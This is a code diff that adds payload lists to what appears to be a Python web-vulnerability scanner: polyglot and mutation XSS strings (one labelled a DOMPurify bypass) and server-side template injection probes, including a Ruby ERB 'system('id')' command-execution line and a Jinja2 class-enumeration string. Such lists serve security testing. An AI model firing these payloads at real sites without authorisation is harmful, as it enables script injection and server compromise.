@@ -139,6 +139,102 @@ ENCODED_PAYLOADS: List[str] = [
     "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
 ]
 
+# ── Polyglot XSS Payloads ─────────────────────────────────────
+# Payloads that execute across multiple contexts (HTML/attribute/JS/URL).
+# One payload = test all contexts at once.
+
+POLYGLOT_PAYLOADS: List[str] = [
+    # Classic universal polyglot (html + attr + js + url)
+    """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e""",
+    # Short polyglot: works in href/src/action + event handler
+    """javascript:alert(1)<!--</script><img src=x onerror=alert(1)>--!>""",
+    # Attribute-aware polyglot: breaks out of quoted/unquoted attr + HTML
+    """\"autofocus onfocus=alert(1) x="\"""",
+    """'autofocus onfocus=alert(1) x='""",
+    # Template-literal + HTML mixed polyglot
+    """${alert(1)}<img src=x onerror=alert(1)>""",
+    # Multi-context: works in script block + HTML + CSS
+    """</script><svg onload=alert(1)><!--</style>-->""",
+    # Angular sandbox escape + HTML
+    """{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>""",
+    # URL + JS context polyglot
+    """javascript:alert(1)\"\"'--></script><img src=x onerror=alert(1)>""",
+    # Shortest possible multi-context
+    """<!--<img src=x onerror=alert(1)>--!>""",
+    """<script>alert(1)</script><!--<img>-->""",
+]
+
+# ── Mutation XSS (mXSS) Payloads ─────────────────────────────
+# Exploit browser parser mutations — innerHTML/setHTML re-parses DOM
+# and the payload "mutates" into executable code.
+
+MXSS_PAYLOADS: List[str] = [
+    # Namespace mutation: <svg><style></style>
+    "<svg><style></style><img src=x onerror=alert(1)>",
+    # <noscript> mutation: contents become innerHTML in noscript-disabled browser
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    # <noembed> mutation (legacy IE/FF)
+    "<noembed><p title=\"</noembed><img src=x onerror=alert(1)>\">",
+    # <math>x<style> mutation
+    "<math><style><!--</style><img src=x onerror=alert(1)>-->",
+    # <template> mutation (shadow DOM re-parsing)
+    "<template><img src=x onerror=alert(1)></template>",
+    # <select> + <script> mutation
+    "<select><style></style><img src=x onerror=alert(1)>",
+    # <form> + <isindex> mutation (legacy)
+    "<form><isindex action=javascript:alert(1)>",
+    # <details> + <style> mutation
+    "<details open><style>/*</style><img src=x onerror=alert(1)>*/",
+    # <table> + <style> mutation
+    "<table><style></style><img src=x onerror=alert(1)>",
+    # <textarea> + <style> mutation
+    "<textarea><style></style><img src=x onerror=alert(1)>",
+    # <title> + <style> mutation
+    "<title><style></style><img src=x onerror=alert(1)>",
+    # DOMPurify bypass v2: namespace confusion
+    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+    # Mutation via <listing>
+    "<listing><style></style><img src=x onerror=alert(1)>",
+    # <xmp> legacy mutation
+    "<xmp><style></style><img src=x onerror=alert(1)>",
+]
+
+# ── SSTI (Server-Side Template Injection) Payloads ────────────
+# Tests for template engine injection in reflected/user-controlled output.
+
+SSTI_PAYLOADS: List[str] = [
+    # Generic template detection
+    "{{7*7}}",
+    "${7*7}",
+    "#{7*7}",
+    "<%= 7*7 %>",
+    "{{7*'7'}}",
+    # Jinja2 / Twig
+    "{{config}}",
+    "{{self}}",
+    "{{''.__class__.__mro__[1].__subclasses__()}}",
+    # FreeMarker
+    "${7*7}",
+    "${7*'7'}",
+    # Velocity
+    "#set($x=7*7)$x",
+    # Jade / Pug
+    "#{7*7}",
+    # Smarty
+    "{$smarty.version}",
+    # ERB (Ruby)
+    "<%= 7*7 %>",
+    "<%= system('id') %>",
+    # Tornado
+    "{{7*7}}",
+    # Angular
+    "{{constructor.constructor('alert(1)')()}}",
+    # Handlebars / Moustache
+    "{{7*7}}",
+    # Nunjucks
+    "{{range(1,2)}}",
+]
+
 WAF_BYPASS_PAYLOADS: List[str] = [
     "<ScRiPt>alert(1)</ScRiPt>",
     "<scrİpt>alert(1)</scrİpt>",
